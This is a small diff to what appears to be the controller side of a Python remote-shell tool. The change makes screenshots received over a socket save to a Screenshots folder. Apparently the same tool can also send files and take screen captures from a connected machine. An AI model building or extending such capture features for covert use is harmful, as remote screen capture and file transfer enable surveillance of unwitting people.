@@ -48,9 +48,9 @@ def shell(mySocket):
             sendFile(mySocket, localPath)
 
         elif 'screencap' == commandList[0]:
-            # just using path here for the name
-            path = os.path.join('/NONEXISTANT-SCREENCAP', dt.now().isoformat())
-            receiveFile(mySocket, path)
+            fileName = dt.now().isoformat()
+            destinationFile = os.path.join(destinationPath + '/Screenshots', fileName)
+            receiveFile(mySocket, destinationFile)
 
         else:
             print(mySocket.recv(chunksize).decode())
